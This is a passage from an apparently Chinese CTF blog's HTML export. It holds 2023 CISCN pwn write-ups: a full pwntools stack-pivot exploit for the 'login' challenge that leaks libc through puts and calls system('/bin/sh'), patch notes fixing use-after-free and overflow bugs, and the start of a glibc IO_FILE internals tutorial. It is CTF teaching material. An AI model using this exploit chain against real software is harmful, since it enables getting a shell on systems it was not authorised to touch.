class="built_in">print</span>(real_flag)</span><br></pre></td></tr></table></figure><h2 id="拾遗"><a href="#拾遗" class="headerlink" title="拾遗"></a>拾遗</h2><details class="folding-tag" blue><summary> 0x1不要过于依赖反汇编 </summary>              <div class='content'>              <p>很多细节其实是藏在汇编代码中的,如果过于依赖反汇编就很难发现这部分细节</p>              </div>            </details><details class="folding-tag" blue><summary> 0x2用pwntools汇编注意设置环境 </summary>              <div class='content'>              <p>pwntools,asm功能默认是在i386下,如果不设置环境的可能会出大错</p>              </div>            </details><details class="folding-tag" blue><summary> 0x3出现过的库函数皆可使用 </summary>              <div class='content'>              <p>只要函数被调用过,并布置好参数,所有的库函数都可以被使用,太久没做栈迁移,竟然忘记用可以用read部署了……….</p>              </div>            </details><details class="folding-tag" blue><summary> 0x4栈迁移的地址选择 </summary>              <div class='content'>              <p>printf和puts等函数调用时使用的栈空间较大,栈迁移后如果迁移位置不合适,很可能会造成内存越界,访问不可写的内存空间,从而产生段错误,故迁移位置一定要足够合适,一般至少要留0x800的可写空间</p>              </div>            </details><h1 id="2023ciscn华东南"><a href="#2023ciscn华东南" class="headerlink" title="2023ciscn华东南"></a>2023ciscn华东南</h1><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-06-25_225313.png" alt=""></p><h3 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h3><p>栈溢出,buf的大小是0xf0</p><p>但是读入0x100会造成栈溢出</p><p>patch输入大小为0xf1即可,不晓得为什么0xf0不行</p><h3 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h3><p>防御只开了nx和got表保护</p><p>溢出有限</p><p>必然要栈迁移</p><p>然后泄露地址,并再次返回到read数据段处</p><p>然后因为要防止栈越界</p><p>要通过read再次调整栈到高处</p><p>最后getshell</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">lr=<span class="number">0x40136E</span></span><br><span class="line">r=<span class="number">0x40101a</span></span><br><span class="line">bss=<span class="number">0x404060</span></span><br><span class="line">bssplus=bss+<span class="number">0xa00</span></span><br><span class="line">pop_rdi=<span class="number">0x4013d3</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x4013d1</span></span><br><span class="line">readagain=<span class="number">0x401353</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./login&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./login&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;175.20.28.11&#x27;,9999)</span></span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf0</span>+p64(bss+<span class="number">0x48</span>)+p64(lr))<span class="comment">#栈迁移</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">9</span>+p64(bss+<span class="number">0x38</span>)<span class="comment">#第二次栈迁移准备,因为可控地区只有这里,只能重新回到这,+0x38防止越界,至于0x38是怎么来的只能靠经验或者调试了</span></span><br><span class="line">payload+=p64(pop_rdi)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])<span class="comment">#泄露地址</span></span><br><span class="line">payload+=p64(r)+p64(readagain)<span class="comment">#第二次栈迁移</span></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">binsh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">gets_addr=libc_base+libc.symbols[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">7</span>+p64(bssplus)+p64(pop_rdi)<span class="comment">#第三次栈迁移准备</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(bssplus)+p64(<span class="number">0</span>)+p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])<span class="comment">#rdx几乎不会改变,保持之前的0x90,故不用布置     #并read往第三次栈迁移目标方向布置栈</span></span><br><span class="line">payload+=p64(lr)<span class="comment">#第三次栈迁移</span></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.send(p64(bssplus)+p64(pop_rdi)+p64(binsh)+p64(r)+p64(system_addr))<span class="comment">#getshell,注意栈对齐</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>主要就是栈迁移,不过为了防止栈越界,不得不做更多的布置</p><h3 id="拾遗-1"><a href="#拾遗-1" class="headerlink" title="拾遗"></a>拾遗</h3><p>gdb和pause组合有时会产生各种各样的牛马问题,二者单独存在问题不大,但一组合就需要谨慎区别了,确认exp无问题就去掉二者,不然exp对了也无法getshell</p><p>又发现,就算二者组合,只要没有在gdb中操控程序则不会出现问题</p><h2 id="houmt"><a href="#houmt" class="headerlink" title="houmt"></a>houmt</h2><h3 id="patch-1"><a href="#patch-1" class="headerlink" title="patch"></a>patch</h3><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-06-26_194639.png" alt=""></p><p>存在uaf漏洞</p><p>添加置0功能,但显然不能在原来的位置,否则会覆盖其他代码</p><p>选择在eh.frame节上增加功能</p><p>首先修改权限,rwx</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-06-26_201752.png" alt=""></p><p>之后再eh.frame上找一个合适的位置打上补丁</p><p>同样先调用free,之后再重新获得偏移并寻址置零</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-06-26_201911.png" alt=""></p><p>patch成功</p><h3 id="拾遗-2"><a href="#拾遗-2" class="headerlink" title="拾遗"></a>拾遗</h3><p>当要修改的长度大于原有长度时,就需要跳转到别处执行,执行后再返回到原处</p><p>一般选择eh.frame节或者.fini节</p><h2 id="notepad"><a href="#notepad" class="headerlink" title="notepad"></a>notepad</h2><h3 id="patch-2"><a href="#patch-2" class="headerlink" title="patch"></a>patch</h3><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-06-26_202925.png" alt=""></p><p>发现,依然存在uaf,free后只是将存储的chunk的大小置零,而并没有将指针置零</p><p>与上一题很像,但据师傅们所说,按照上一题的方法会存在异常</p><p>于是可以利用原语句中将size置零,去掉偏移即是指针置零</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-06-26_203321.png" alt=""></p><p>将偏移变为0,patch成功</p><h3 id="拾遗-3"><a href="#拾遗-3" class="headerlink" title="拾遗"></a>拾遗</h3><p>合理利用偏移有时候能达到意想不到的效果</p><h2 id="MaskNote"><a href="#MaskNote" class="headerlink" title="MaskNote"></a>MaskNote</h2><h3 id="patch-3"><a href="#patch-3" class="headerlink" title="patch"></a>patch</h3><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-06-26_203629.png" alt=""></p><p>连接字符串长度超过其原有长度</p><p>修改<br><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-06-26_204812.png" alt=""></p><p>patch成功</p>]]></content>
      
      
      <categories>
          
          <category> 题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO_FILE</title>
      <link href="/posts/23411/"/>
      <url>/posts/23411/</url>
      
        <content type="html"><![CDATA[<h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><h2 id="相关结构体"><a href="#相关结构体" class="headerlink" title="相关结构体"></a>相关结构体</h2><p>先看IO_FILE结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];<span class="comment">//如果文件缓冲区是unbuffered()，则_shortbuf[1]用作缓冲区。</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;<span class="comment">//</span></span><br><span class="line"><span class="meta"># <span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  <span class="type">void</span> *__pad1;</span><br><span class="line">  <span class="type">void</span> *__pad2;</span><br><span class="line">  <span class="type">void</span> *__pad3;</span><br><span class="line">  <span class="type">void</span> *__pad4;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;  <span class="comment">//&lt;=0为非宽字节,&gt;0为宽字节</span></span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其又被封装于_IO_FILE_plus</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8</p><details class="folding-tag" blue><summary> 其中_IO_jump_t结构体的定义为 </summary>              <div class='content'>              <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>虚表函数的定义一般都在libio/fileops.c中</p><p>一些虚表函数定义找不到对应的函数是因为做了一些替代</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">versioned_symbol (libc, _IO_new_do_write, _IO_do_write, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_attach, _IO_file_attach, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_close_it, _IO_file_close_it, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_finish, _IO_file_finish, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_fopen, _IO_file_fopen, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_init, _IO_file_init, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_setbuf, _IO_file_setbuf, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_sync, _IO_file_sync, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_overflow, _IO_file_overflow, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_seekoff, _IO_file_seekoff, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_underflow, _IO_file_underflow, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_write, _IO_file_write, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_xsputn, _IO_file_xsputn, GLIBC_2_1);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> versioned_symbol(lib,local,symbol,version) weak_alias (local, symbol)</span></span><br></pre></td></tr></table></figure>              </div>            </details><p>一个进程中的所有FILE结构体会通过<strong>_chain字段</strong>连接成为一个单链表,链表的头部是全局变量<strong>_IO_list_all</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> *_<span class="title">IO_list_all</span>;</span></span><br></pre></td></tr></table></figure><p>这个_IO_list_all也是采取的头插入法</p><p>_IO_list_all位于libc中</p><h2 id="三个特殊流"><a href="#三个特殊流" class="headerlink" title="三个特殊流"></a>三个特殊流</h2><p>在标准 I/O 库中，每个程序启动时有三个文件流是<strong>自动打开</strong>的：<strong>stdin、stdout、stderr</strong>。</p><p>但是在第一次使用前,均属于未被初始化状态(主要是_IO_read_ptr到_IO_buf_end这个8个域),其初始化时分配的缓冲区位于堆,且一般是堆最早的三个堆块.</p><p>因此在初始状态下，_IO_list_all 指向了一个有这些文件流构成的链表，需要注意的是<strong>这三个文件流位于 libc.so 的数据段</strong>。而我们使用 <strong>fopen 创建的文件流是分配在堆内存上</strong>的。</p><p>libc.so 中存在 stdin\stdout\stderr 等符号，这些符号是指向 FILE 结构的指针，真正结构的符号是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_IO_2_1_stderr_</span><br><span class="line">_IO_2_1_stdout_</span><br><span class="line">_IO_2_1_stdin_</span><br></pre></td></tr></table></figure><details class="folding-tag" blue><summary> 关于上面这句话的理解 </summary>              <div class='content'>              <p>学习过程中经常遇到符号这个概念,这里学习一下</p><p><strong>在 C 语言中，变量的名字就是符号（symbol）</strong>。当编译器编译源代码时，会在符号表（symbol table）中为每个符号分配一个唯一的标识符，并记录它的类型、作用域和存储位置等信息。对于全局变量和静态变量，它们的符号被放置在全局符号表中，而对于局部变量，则被放置在局部符号表中。</p><p><strong>也就是说一个符号被用来代表一个变量的实例,而这个变量可以是结构体,函数或常规变量类型等等</strong></p><p>在了解了符号之后就能理解上面这句话了</p><p>_IO<em>2_1_stderr\</em>和_<em>IO_2_1_stdout\</em>和<em>_IO_2_1_stdin\</em>这三个符号对应的是三个IO_FILE<u>结构体变量的名字</u></p><p>stdin\stdout\stderr三个符号是指向三个IO_FILE结构体变量的<u>指针变量的名字</u></p>              </div>            </details><h2 id="fwrite和fread"><a href="#fwrite和fread" class="headerlink" title="fwrite和fread"></a>fwrite和fread</h2><p>fread 的实现被封装在_IO_fread,真正实现功能的是其中的_IO_sgetn,而_IO_sgetn又会调用_IO_XSGETN,而_IO_XSGETN 是vtable 中的函数指针，在调用这个函数时会首先取出 vtable 中的指针然后再进行调用。默认情况下_IO_file_xsgetn中存储的指针指向_IO_file_xsgetn</p><p>fwrite的实现被封装在_IO_fwrite中,在_IO_fwrite 中主要是调用_IO_XSPUTN 来实现写入的功能。_IO_XSPUTN是位于vtable中的函数指针,在_IO_XSPUTN 指向的_IO_new_file_xsputn 中会调用同样位于 vtable 中的_IO_OVERFLOW,_IO_OVERFLOW 默认指向的函数是_IO_new_file_overflow</p><h2 id="fopen和fclose"><a href="#fopen和fclose" class="headerlink" title="fopen和fclose"></a>fopen和fclose</h2><p>fopen 的操作是</p><ul><li>使用 malloc 分配 FILE 结构</li><li>设置 FILE 结构的 vtable</li><li>初始化分配的 FILE 结构</li><li>将初始化的 FILE 结构链入 FILE 结构链表中</li><li>调用系统调用打开文件</li></ul><p>fclose的操作是</p><ul><li>将指定的 FILE 从_chain 链表中脱链</li><li>调用系统接口 close 关闭文件</li><li>最后调用 vtable 中的_IO_FINISH，其对应的是_IO_file_finish 函数，其中会调用 free 函数释放之前分配的 FILE 结构</li></ul><h2 id="printf和puts"><a href="#printf和puts" class="headerlink" title="printf和puts"></a>printf和puts</h2><p>printf 和 puts 是常用的输出函数，在 printf 的参数是以’\n’结束的纯字符串时，printf 会被优化为 puts 函数并去除换行符。</p><p>puts 在源码中实现的函数是_IO_puts，这个函数的操作与 fwrite 的流程大致相同，函数内部同样会调用 vtable 中的_IO_sputn，结果会执行_IO_new_file_xsputn，最后会调用到系统接口 write 函数。</p><hr><h2 id="flags标记"><a href="#flags标记" class="headerlink" title="_flags标记"></a>_flags标记</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Magic number and bits for the _flags field.  The magic number is</span></span><br><span class="line"><span class="comment">   mostly vestigial, but preserved for compatibility.  It occupies the</span></span><br><span class="line"><span class="comment">   high 16 bits of _flags; the low 16 bits are actual flag bits.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC         0xFBAD0000 <span class="comment">/* Magic number 可以校验文件是否有效*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC_MASK    0xFFFF0000<span class="comment">//掩码，用于提取flag有效部分</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_BUF          0x0001 <span class="comment">/* Don&#x27;t deallocate buffer on close. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_UNBUFFERED        0x0002<span class="comment">//文件流处于无缓冲模式</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_READS          0x0004 <span class="comment">/* Reading not allowed.读文件流被禁止  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_WRITES         0x0008 <span class="comment">/* Writing not allowed.写文件流被禁止  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_EOF_SEEN          0x0010<span class="comment">//文件流已经到达文件的末尾</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_ERR_SEEN          0x0020<span class="comment">//文件流上发生了错误</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_DELETE_DONT_CLOSE 0x0040 <span class="comment">/* Don&#x27;t call close(_fileno) on close.执行文件删除操作时不关闭文件流  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINKED            0x0080 <span class="comment">/* In the list of all open files.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IN_BACKUP         0x0100<span class="comment">//文件流正在执行备份操作</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINE_BUF          0x0200<span class="comment">//文件流为行缓冲模式</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_TIED_PUT_GET      0x0400 <span class="comment">/* Put and get pointer move in unison.关联put和get  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x0800<span class="comment">//文件流当前正在写入数据(往文件流中写入数据)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_APPENDING      0x1000<span class="comment">//文件流处于&quot;追加模式&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_FILEBUF        0x2000<span 